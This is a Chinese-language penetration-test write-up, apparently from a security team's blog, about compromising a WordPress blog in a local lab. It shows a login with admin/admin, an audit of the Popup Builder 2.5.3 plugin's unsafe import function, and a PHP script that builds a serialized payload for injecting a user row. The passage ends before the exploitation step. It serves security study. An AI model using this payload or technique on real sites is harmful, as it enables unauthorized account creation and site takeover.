# 渗透测试案例：黑与白的较量
## 原创：队员编号001 | 酒仙桥六号部队 | 2020年6月17日
本文是酒仙桥六号部队系列文章中的第20篇。全文约3002字，预计阅读时间为10分钟。

### 背景介绍
本案例基于之前进行的一次渗透测试经历编写而成。由于当时未做详细的截图和记录，故文中采用本地环境复现了整个过程。如果读者发现某些细节与实际情况存在差异，请理解这可能是由于本地环境未能完全复制真实场景所致。本文旨在分享在该渗透测试中所采取的主要思路和技术方法。

### 寻找突破口
目标网站是一个博客系统，并通过Web指纹识别工具确认其为WordPress平台（实际上手动也能完成此步骤）。初步检查前台并未发现有价值的信息；随后尝试访问默认后台路径`/wp-admin/`并用弱密码组合`admin/admin`成功登录。

然而，在进一步探索过程中发现，常规用于获取shell的方法如插件上传或主题修改等均不可行，因为相关功能已被移除。最终注意到已安装的一个名为Popup Builder版本2.5.3的插件，决定对其进行深入研究。

### 代码审计
#### Popup Builder 插件简介
- **功能描述**：Popup Builder是一款专为WordPress设计的弹出窗口构建器，支持创建吸引用户注意力的促销信息。
- **当前状态**：已有超过十万活跃安装量。

#### 漏洞分析
尽管最新版已更新至3.65.1，但目标站点仍使用较旧的2.5.3版本。利用特定技巧下载了对应版本后，通过对`\wp-content\plugins\popup-builder\files\sg_popup_ajax.php`文件中的`sgImportPopups`函数进行分析，发现了潜在的安全隐患——该函数直接处理未经验证的`attachmentUrl`参数值。

具体而言，该函数接收POST请求传递的`attachmentUrl`，并通过`file_get_contents()`读取内容，经过Base64解码及反序列化操作后将数据存储到数据库中。这意味着攻击者可以构造特殊格式的数据以执行SQL注入攻击。

#### 构造Payload
根据上述逻辑漏洞，我们编写了一个PHP脚本来生成相应的恶意负载：
```php
$contents = array(
    'users' => array(array('aaaa', '$BG3Bc6Y9Er4hAHVCBvTVkbs9HJ0lKk.', 'aaaa', 'PI:EMAIL', 'https://aaa.cn', '0', 'aaaa')),
    'customTablesColumsName' => array(
        'users' => array(
            array('Field' => 'user_login'),
            array('Field' => 'user_pass'),
            // 更多字段...
        )
    )
);
$payload = base64_encode(serialize($contents));
echo $payload;
```
运行上述脚本即可得到可用于发起攻击的有效载荷。

接下来的部分将讨论如何利用这个payload对目标系统实施攻击以及后续可能的操作步骤。请注意，所有演示仅限于教育目的，请勿非法应用！